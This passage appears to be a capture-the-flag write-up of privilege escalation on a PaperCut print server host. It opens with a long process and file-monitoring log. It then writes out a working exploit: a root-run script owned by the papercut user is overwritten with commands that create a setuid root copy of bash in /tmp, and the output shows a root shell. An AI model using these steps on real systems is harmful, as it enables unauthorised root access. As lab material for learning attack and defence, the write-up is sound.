2026/03/21 06:45:41 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_PAPER
2026/03/21 06:45:41 FS:             OPEN DIR | /usr/lib/locale/C.utf8/LC_MESSAGES
2026/03/21 06:45:41 FS:             OPEN DIR | /usr/lib/locale/C.utf8/LC_MESSAGES/
2026/03/21 06:45:41 FS:    CLOSE_NOWRITE DIR | /usr/lib/locale/C.utf8/LC_MESSAGES
2026/03/21 06:45:41 FS:    CLOSE_NOWRITE DIR | /usr/lib/locale/C.utf8/LC_MESSAGES/
2026/03/21 06:45:41 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_MESSAGES/SYS_LC_MESSAGES
2026/03/21 06:45:41 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_MONETARY
2026/03/21 06:45:41 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_COLLATE
2026/03/21 06:45:41 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_TIME
2026/03/21 06:45:41 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_NUMERIC
2026/03/21 06:45:41 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_CTYPE
2026/03/21 06:45:41 FS:                 OPEN | /etc/nsswitch.conf
2026/03/21 06:45:41 FS:               ACCESS | /etc/nsswitch.conf
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /etc/nsswitch.conf
2026/03/21 06:45:41 CMD: UID=0     PID=33348  | 
2026/03/21 06:45:41 FS:                 OPEN | /etc/passwd
2026/03/21 06:45:41 FS:               ACCESS | /etc/passwd
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /etc/passwd
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /usr/bin/getent
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_IDENTIFICATION
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_MEASUREMENT
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_TELEPHONE
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_ADDRESS
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_NAME
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_PAPER
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_MESSAGES/SYS_LC_MESSAGES
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_MONETARY
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_COLLATE
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_TIME
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_NUMERIC
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_CTYPE
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /usr/lib/x86_64-linux-gnu/libc.so.6
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive
2026/03/21 06:45:41 FS:                 OPEN | /usr/bin/getent
2026/03/21 06:45:41 FS:               ACCESS | /usr/bin/getent
2026/03/21 06:45:41 FS:                 OPEN | /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
2026/03/21 06:45:41 FS:               ACCESS | /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
2026/03/21 06:45:41 FS:                 OPEN | /etc/ld.so.cache
2026/03/21 06:45:41 FS:                 OPEN | /usr/lib/x86_64-linux-gnu/libc.so.6
2026/03/21 06:45:41 FS:               ACCESS | /usr/lib/x86_64-linux-gnu/libc.so.6
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /etc/ld.so.cache
2026/03/21 06:45:41 FS:                 OPEN | /usr/lib/locale/locale-archive
2026/03/21 06:45:41 FS:                 OPEN | /etc/locale.alias
2026/03/21 06:45:41 FS:               ACCESS | /etc/locale.alias
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /etc/locale.alias
2026/03/21 06:45:41 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_IDENTIFICATION
2026/03/21 06:45:41 FS:                 OPEN | /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache
2026/03/21 06:45:41 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_MEASUREMENT
2026/03/21 06:45:41 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_TELEPHONE
2026/03/21 06:45:41 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_ADDRESS
2026/03/21 06:45:41 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_NAME
2026/03/21 06:45:41 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_PAPER
2026/03/21 06:45:41 FS:             OPEN DIR | /usr/lib/locale/C.utf8/LC_MESSAGES
2026/03/21 06:45:41 FS:             OPEN DIR | /usr/lib/locale/C.utf8/LC_MESSAGES/
2026/03/21 06:45:41 FS:    CLOSE_NOWRITE DIR | /usr/lib/locale/C.utf8/LC_MESSAGES
2026/03/21 06:45:41 FS:    CLOSE_NOWRITE DIR | /usr/lib/locale/C.utf8/LC_MESSAGES/
2026/03/21 06:45:41 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_MESSAGES/SYS_LC_MESSAGES
2026/03/21 06:45:41 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_MONETARY
2026/03/21 06:45:41 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_COLLATE
2026/03/21 06:45:41 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_TIME
2026/03/21 06:45:41 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_NUMERIC
2026/03/21 06:45:41 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_CTYPE
2026/03/21 06:45:41 FS:                 OPEN | /etc/nsswitch.conf
2026/03/21 06:45:41 FS:               ACCESS | /etc/nsswitch.conf
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /etc/nsswitch.conf
2026/03/21 06:45:41 FS:                 OPEN | /etc/passwd
2026/03/21 06:45:41 FS:               ACCESS | /etc/passwd
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /etc/passwd
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /usr/bin/getent
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_IDENTIFICATION
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_MEASUREMENT
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_TELEPHONE
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_ADDRESS
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_NAME
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_PAPER
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_MESSAGES/SYS_LC_MESSAGES
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_MONETARY
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_COLLATE
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_TIME
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_NUMERIC
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_CTYPE
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /usr/lib/x86_64-linux-gnu/libc.so.6
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /var/lib/snapd/inhibit/amazon-ssm-agent.lock
2026/03/21 06:45:41 FS:                 OPEN | /var/lib/snapd/seccomp/bpf/snap.amazon-ssm-agent.amazon-ssm-agent.bin2
2026/03/21 06:45:41 FS:               ACCESS | /var/lib/snapd/seccomp/bpf/snap.amazon-ssm-agent.amazon-ssm-agent.bin2
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /var/lib/snapd/seccomp/bpf/snap.amazon-ssm-agent.amazon-ssm-agent.bin2
2026/03/21 06:45:41 FS:                 OPEN | /usr/lib/os-release
2026/03/21 06:45:41 FS:               ACCESS | /usr/lib/os-release
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /usr/lib/os-release
2026/03/21 06:45:41 FS:                 OPEN | /usr/lib/snapd/info
2026/03/21 06:45:41 FS:               ACCESS | /usr/lib/snapd/info
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /usr/lib/snapd/info
2026/03/21 06:45:41 FS:               MODIFY | /var/log/journal/ec24bb3c93c763aec32587112a07e891/system.journal
2026/03/21 06:45:41 FS:                 OPEN | /usr/share/zoneinfo/Etc/UTC
2026/03/21 06:45:41 FS:               ACCESS | /usr/share/zoneinfo/Etc/UTC
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /usr/share/zoneinfo/Etc/UTC
2026/03/21 06:45:41 FS:                 OPEN | /etc/passwd
2026/03/21 06:45:41 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:41 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:41 FS:               ACCESS | /etc/passwd
2026/03/21 06:45:41 FS:        CLOSE_NOWRITE | /etc/passwd
2026/03/21 06:45:41 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:41 FS:               MODIFY | /var/log/laurel/audit.log
2026/03/21 06:45:41 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:42 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:42 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:42 FS:               MODIFY | /var/log/journal/ec24bb3c93c763aec32587112a07e891/system.journal
2026/03/21 06:45:42 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:42 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:42 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:42 FS:               MODIFY | /var/log/journal/ec24bb3c93c763aec32587112a07e891/system.journal
2026/03/21 06:45:42 FS:             OPEN DIR | /var/log/journal/ec24bb3c93c763aec32587112a07e891
2026/03/21 06:45:42 FS:             OPEN DIR | /var/log/journal/ec24bb3c93c763aec32587112a07e891/
2026/03/21 06:45:42 FS:           ACCESS DIR | /var/log/journal/ec24bb3c93c763aec32587112a07e891
2026/03/21 06:45:42 FS:           ACCESS DIR | /var/log/journal/ec24bb3c93c763aec32587112a07e891/
2026/03/21 06:45:42 FS:           ACCESS DIR | /var/log/journal/ec24bb3c93c763aec32587112a07e891
2026/03/21 06:45:42 FS:           ACCESS DIR | /var/log/journal/ec24bb3c93c763aec32587112a07e891/
2026/03/21 06:45:42 FS:    CLOSE_NOWRITE DIR | /var/log/journal/ec24bb3c93c763aec32587112a07e891
2026/03/21 06:45:42 FS:    CLOSE_NOWRITE DIR | /var/log/journal/ec24bb3c93c763aec32587112a07e891/
2026/03/21 06:45:42 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:42 FS:               MODIFY | /var/log/journal/ec24bb3c93c763aec32587112a07e891/system.journal
2026/03/21 06:45:42 FS:             OPEN DIR | /home/papercut/server
2026/03/21 06:45:42 FS:             OPEN DIR | /home/papercut/server/
2026/03/21 06:45:42 FS:           ACCESS DIR | /home/papercut/server
2026/03/21 06:45:42 FS:           ACCESS DIR | /home/papercut/server/
2026/03/21 06:45:42 FS:           ACCESS DIR | /home/papercut/server
2026/03/21 06:45:42 FS:           ACCESS DIR | /home/papercut/server/
2026/03/21 06:45:42 FS:    CLOSE_NOWRITE DIR | /home/papercut/server
2026/03/21 06:45:42 FS:    CLOSE_NOWRITE DIR | /home/papercut/server/
2026/03/21 06:45:42 FS:               MODIFY | /var/log/laurel/audit.log
2026/03/21 06:45:43 FS:               MODIFY | /var/log/journal/ec24bb3c93c763aec32587112a07e891/system.journal
2026/03/21 06:45:44 FS:               MODIFY | /var/log/laurel/audit.log
2026/03/21 06:45:44 FS:               MODIFY | /var/log/journal/ec24bb3c93c763aec32587112a07e891/system.journal
2026/03/21 06:45:45 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:45 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:45 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:45 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:45 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:45 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:45 FS:               MODIFY | /var/log/journal/ec24bb3c93c763aec32587112a07e891/system.journal
2026/03/21 06:45:45 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:45 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:45 FS:               MODIFY | /var/log/laurel/audit.log
2026/03/21 06:45:45 FS:               MODIFY | /var/log/journal/ec24bb3c93c763aec32587112a07e891/system.journal
2026/03/21 06:45:45 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:45 FS:               MODIFY | /var/log/journal/ec24bb3c93c763aec32587112a07e891/system.journal
2026/03/21 06:45:46 FS:               MODIFY | /var/log/laurel/audit.log
2026/03/21 06:45:46 FS:               CREATE | /home/papercut/server/data/internal/state/systemstate/job-authentication.new.ser
2026/03/21 06:45:46 FS:                 OPEN | /home/papercut/server/data/internal/state/systemstate/job-authentication.new.ser
2026/03/21 06:45:46 FS:               MODIFY | /home/papercut/server/data/internal/state/systemstate/job-authentication.new.ser
2026/03/21 06:45:46 FS:          CLOSE_WRITE | /home/papercut/server/data/internal/state/systemstate/job-authentication.new.ser
2026/03/21 06:45:46 FS:               DELETE | /home/papercut/server/data/internal/state/systemstate/job-authentication.curr.ser
2026/03/21 06:45:46 FS:           MOVED_FROM | /home/papercut/server/data/internal/state/systemstate/job-authentication.new.ser
2026/03/21 06:45:46 FS:             MOVED_TO | /home/papercut/server/data/internal/state/systemstate/job-authentication.curr.ser
2026/03/21 06:45:46 FS:               CREATE | /home/papercut/server/data/internal/state/systemstate/user-client-data.new.ser
2026/03/21 06:45:46 FS:                 OPEN | /home/papercut/server/data/internal/state/systemstate/user-client-data.new.ser
2026/03/21 06:45:46 FS:               MODIFY | /home/papercut/server/data/internal/state/systemstate/user-client-data.new.ser
2026/03/21 06:45:46 FS:          CLOSE_WRITE | /home/papercut/server/data/internal/state/systemstate/user-client-data.new.ser
2026/03/21 06:45:46 FS:               DELETE | /home/papercut/server/data/internal/state/systemstate/user-client-data.curr.ser
2026/03/21 06:45:46 FS:           MOVED_FROM | /home/papercut/server/data/internal/state/systemstate/user-client-data.new.ser
2026/03/21 06:45:46 FS:             MOVED_TO | /home/papercut/server/data/internal/state/systemstate/user-client-data.curr.ser
2026/03/21 06:45:46 FS:               CREATE | /home/papercut/server/data/internal/state/systemstate/script-state.new.ser
2026/03/21 06:45:46 FS:                 OPEN | /home/papercut/server/data/internal/state/systemstate/script-state.new.ser
2026/03/21 06:45:46 FS:               MODIFY | /home/papercut/server/data/internal/state/systemstate/script-state.new.ser
2026/03/21 06:45:46 FS:          CLOSE_WRITE | /home/papercut/server/data/internal/state/systemstate/script-state.new.ser
2026/03/21 06:45:46 FS:               DELETE | /home/papercut/server/data/internal/state/systemstate/script-state.curr.ser
2026/03/21 06:45:46 FS:           MOVED_FROM | /home/papercut/server/data/internal/state/systemstate/script-state.new.ser
2026/03/21 06:45:46 FS:             MOVED_TO | /home/papercut/server/data/internal/state/systemstate/script-state.curr.ser
2026/03/21 06:45:46 FS:               CREATE | /home/papercut/server/data/internal/state/systemstate/held-jobs.new.ser
2026/03/21 06:45:46 FS:                 OPEN | /home/papercut/server/data/internal/state/systemstate/held-jobs.new.ser
2026/03/21 06:45:46 FS:               MODIFY | /home/papercut/server/data/internal/state/systemstate/held-jobs.new.ser
2026/03/21 06:45:46 FS:          CLOSE_WRITE | /home/papercut/server/data/internal/state/systemstate/held-jobs.new.ser
2026/03/21 06:45:46 FS:               DELETE | /home/papercut/server/data/internal/state/systemstate/held-jobs.curr.ser
2026/03/21 06:45:46 FS:           MOVED_FROM | /home/papercut/server/data/internal/state/systemstate/held-jobs.new.ser
2026/03/21 06:45:46 FS:             MOVED_TO | /home/papercut/server/data/internal/state/systemstate/held-jobs.curr.ser
2026/03/21 06:45:46 FS:               CREATE | /home/papercut/server/data/internal/state/systemstate/web-print.new.ser
2026/03/21 06:45:46 FS:                 OPEN | /home/papercut/server/data/internal/state/systemstate/web-print.new.ser
2026/03/21 06:45:46 FS:               MODIFY | /home/papercut/server/data/internal/state/systemstate/web-print.new.ser
2026/03/21 06:45:46 FS:          CLOSE_WRITE | /home/papercut/server/data/internal/state/systemstate/web-print.new.ser
2026/03/21 06:45:46 FS:               DELETE | /home/papercut/server/data/internal/state/systemstate/web-print.curr.ser
2026/03/21 06:45:46 FS:           MOVED_FROM | /home/papercut/server/data/internal/state/systemstate/web-print.new.ser
2026/03/21 06:45:46 FS:             MOVED_TO | /home/papercut/server/data/internal/state/systemstate/web-print.curr.ser
2026/03/21 06:45:46 FS:               CREATE | /home/papercut/server/data/internal/state/systemstate/device-txns.new.ser
2026/03/21 06:45:46 FS:                 OPEN | /home/papercut/server/data/internal/state/systemstate/device-txns.new.ser
2026/03/21 06:45:46 FS:               MODIFY | /home/papercut/server/data/internal/state/systemstate/device-txns.new.ser
2026/03/21 06:45:46 FS:          CLOSE_WRITE | /home/papercut/server/data/internal/state/systemstate/device-txns.new.ser
2026/03/21 06:45:46 FS:               DELETE | /home/papercut/server/data/internal/state/systemstate/device-txns.curr.ser
2026/03/21 06:45:46 FS:           MOVED_FROM | /home/papercut/server/data/internal/state/systemstate/device-txns.new.ser
2026/03/21 06:45:46 FS:             MOVED_TO | /home/papercut/server/data/internal/state/systemstate/device-txns.curr.ser
2026/03/21 06:45:46 FS:               MODIFY | /var/log/journal/ec24bb3c93c763aec32587112a07e891/system.journal
2026/03/21 06:45:47 FS:               MODIFY | /var/log/laurel/audit.log
2026/03/21 06:45:47 FS:             OPEN DIR | /home/papercut/server
2026/03/21 06:45:47 FS:             OPEN DIR | /home/papercut/server/
2026/03/21 06:45:47 FS:           ACCESS DIR | /home/papercut/server
2026/03/21 06:45:47 FS:           ACCESS DIR | /home/papercut/server/
2026/03/21 06:45:47 FS:           ACCESS DIR | /home/papercut/server
2026/03/21 06:45:47 FS:           ACCESS DIR | /home/papercut/server/
2026/03/21 06:45:47 FS:    CLOSE_NOWRITE DIR | /home/papercut/server
2026/03/21 06:45:47 FS:    CLOSE_NOWRITE DIR | /home/papercut/server/
2026/03/21 06:45:48 FS:               MODIFY | /var/log/journal/ec24bb3c93c763aec32587112a07e891/system.journal
2026/03/21 06:45:48 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:48 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:48 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:48 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:48 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:49 FS:               MODIFY | /var/log/journal/ec24bb3c93c763aec32587112a07e891/system.journal
2026/03/21 06:45:49 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:49 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:49 FS:               MODIFY | /var/log/laurel/audit.log
2026/03/21 06:45:49 FS:               MODIFY | /var/log/journal/ec24bb3c93c763aec32587112a07e891/system.journal
2026/03/21 06:45:49 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:49 FS:               MODIFY | /var/log/journal/ec24bb3c93c763aec32587112a07e891/system.journal
2026/03/21 06:45:50 FS:               MODIFY | /var/log/laurel/audit.log
2026/03/21 06:45:50 FS:               MODIFY | /var/log/journal/ec24bb3c93c763aec32587112a07e891/system.journal
2026/03/21 06:45:51 FS:               MODIFY | /var/log/laurel/audit.log
2026/03/21 06:45:51 FS:               MODIFY | /var/log/journal/ec24bb3c93c763aec32587112a07e891/system.journal
2026/03/21 06:45:51 FS:               MODIFY | /var/log/laurel/audit.log
2026/03/21 06:45:51 FS:               MODIFY | /var/log/laurel/audit.log
2026/03/21 06:45:52 FS:               MODIFY | /var/log/journal/ec24bb3c93c763aec32587112a07e891/system.journal
2026/03/21 06:45:52 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:52 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:52 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:52 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:52 FS:               MODIFY | /var/log/laurel/audit.log
2026/03/21 06:45:52 FS:               MODIFY | /var/log/journal/ec24bb3c93c763aec32587112a07e891/system.journal
2026/03/21 06:45:52 FS:               MODIFY | /var/log/laurel/audit.log
2026/03/21 06:45:52 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:52 FS:                 OPEN | /etc/environment
2026/03/21 06:45:52 FS:               ACCESS | /etc/environment
2026/03/21 06:45:52 FS:        CLOSE_NOWRITE | /etc/environment
2026/03/21 06:45:52 CMD: UID=0     PID=33359  | (snap) 

```

There’s nothing interesting happening on a cron. Exploring all the settings on the website, eventually I’ll find something interesting. Under “Enable Printing”, I’ll click the little “<” at the right side:

go to get http://127.0.0.1:9191/app?service=page/SetupCompleted

![Pasted image 20260321150509.png](/ob/Pasted%20image%2020260321150509.png)

![Pasted image 20260321150525.png](/ob/Pasted%20image%2020260321150525.png)

![Pasted image 20260321151022.png](/ob/Pasted%20image%2020260321151022.png)

![Pasted image 20260321151102.png](/ob/Pasted%20image%2020260321151102.png)

```
2026/03/21 07:13:34 CMD: UID=0     PID=38105  | /bin/sh /home/papercut/server/bin/linux-x64/server-command get-config health.api.key 
```

To exploit this is simple. papercut controls that directory and binary:

```
papercut@bamboo:~/server/bin/linux-x64$ ls -al 
total 13128
drwxr-xr-x 3 papercut papercut     4096 May 26  2023 .
drwx------ 3 papercut papercut     4096 Sep 29  2022 ..
-rw-r--r-- 1 papercut papercut     1522 Sep 29  2022 .common
-rwxr-xr-x 1 papercut papercut   111027 Sep 29  2022 app-monitor
-rw-r--r-- 1 papercut papercut     5514 Sep 29  2022 app-monitor.conf
-rwxr-xr-x 1 papercut papercut    16658 Sep 29  2022 app-server
-r-s--x--x 1 root     root        11071 Sep 29  2022 authpam
-rwxr-xr-x 1 papercut papercut     2456 Sep 29  2022 authsamba
-rwxr-xr-x 1 papercut papercut      479 Sep 29  2022 create-client-config-file
-rwxr-xr-x 1 papercut papercut      468 Sep 29  2022 create-ssl-keystore
-rwxr-xr-x 1 papercut papercut      763 Sep 29  2022 db-tools
-rwxr-xr-x 1 papercut papercut      501 Sep 29  2022 direct-print-monitor-config-initializer
-rwxr-xr-x 1 papercut papercut     2306 Sep 29  2022 gather-ldap-settings
drwxr-xr-x 2 papercut papercut     4096 May 26  2023 lib
-rwxr-xr-x 1 papercut papercut   493309 Sep 29  2022 pc-pdl-to-image
-rwxr-xr-x 1 papercut papercut 12689408 Sep 29  2022 pc-split-scan
-rwxr-xr-x 1 papercut papercut     9558 Sep 29  2022 pc-udp-redirect
-rwxr-xr-x 1 papercut papercut     7561 Sep 29  2022 roottasks
-rwxr-xr-x 1 papercut papercut     7777 Sep 29  2022 sambauserdir
-rwxr-xr-x 1 papercut papercut      493 Sep 29  2022 server-command
-rwxr-xr-x 1 papercut papercut     2253 Sep 29  2022 setperms
-rwxr-xr-x 1 papercut papercut      286 Sep 29  2022 start-server
-rwxr-xr-x 1 papercut papercut    11108 Sep 29  2022 stduserdir
-rwxr-xr-x 1 papercut papercut      279 Sep 29  2022 stop-server
-rwxr-xr-x 1 papercut papercut      480 Sep 29  2022 upgrade-server-configuration
papercut@bamboo:~/server/bin/linux-x64$ 

```

```
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/test\nchown root:root /tmp/test\nchmod 6777 /tmp/test' | tee server-command
```

```shell
papercut@bamboo:~/server/bin/linux-x64$ mv server-command server-command.bk
papercut@bamboo:~/server/bin/linux-x64$ echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/test\nchown root:root /tmp/test\nchmod 6777 /tmp/test' | tee server-command
#!/bin/bash

cp /bin/bash /tmp/test
chown root:root /tmp/test
chmod 6777 /tmp/test
papercut@bamboo:~/server/bin/linux-x64$ 
papercut@bamboo:~/server/bin/linux-x64$ chmod +x server-command
```

![Pasted image 20260321152121.png](/ob/Pasted%20image%2020260321152121.png)

```
papercut@bamboo:~/server/bin/linux-x64$ ls -l /tmp/test
-rwsrwsrwx 1 root root 1396520 Mar 21 07:21 /tmp/test
papercut@bamboo:~/server/bin/linux-x64$ 
```

```
papercut@bamboo:~/server/bin/linux-x64$ /tmp/test -p
test-5.1# whoami
root
test-5.1# 
```
